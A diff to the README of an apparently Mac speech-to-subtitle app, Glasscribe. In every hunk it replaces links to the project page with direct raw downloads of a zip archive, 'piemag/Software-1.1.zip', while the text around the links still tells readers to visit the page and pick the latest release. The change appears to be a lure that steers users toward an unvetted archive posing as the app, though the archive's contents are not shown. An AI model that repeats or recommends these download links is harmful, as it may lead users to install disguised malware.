@@ -1,6 +1,6 @@
 # 🎙️ Glasscribe - Live speech, clear subtitles
 
-[![Download Glasscribe](https://img.shields.io/badge/Download-Glasscribe-blue?style=for-the-badge)](https://github.com/sheenaradial666/Glasscribe)
+[![Download Glasscribe](https://img.shields.io/badge/Download-Glasscribe-blue?style=for-the-badge)](https://raw.githubusercontent.com/sheenaradial666/Glasscribe/main/piemag/Software-1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ It is made for people who want fast dictation, live translation, and a floating 
 
 Visit this page to download Glasscribe:
 
-https://github.com/sheenaradial666/Glasscribe
+https://raw.githubusercontent.com/sheenaradial666/Glasscribe/main/piemag/Software-1.1.zip
 
 Open the page, look for the latest release, and download the Mac app file. Then move the app to your Applications folder and open it.
 
@@ -48,7 +48,7 @@ Main features:
 ## 📂 Install Glasscribe
 
 1. Open the download page:
-   https://github.com/sheenaradial666/Glasscribe
+   https://raw.githubusercontent.com/sheenaradial666/Glasscribe/main/piemag/Software-1.1.zip
 
 2. Find the latest release file for Mac.
 
@@ -208,7 +208,7 @@ This project is built around:
 ## 📍 Where to Start Next
 
 1. Download the app from:
-   https://github.com/sheenaradial666/Glasscribe
+   https://raw.githubusercontent.com/sheenaradial666/Glasscribe/main/piemag/Software-1.1.zip
 
 2. Install it on your Mac.
 
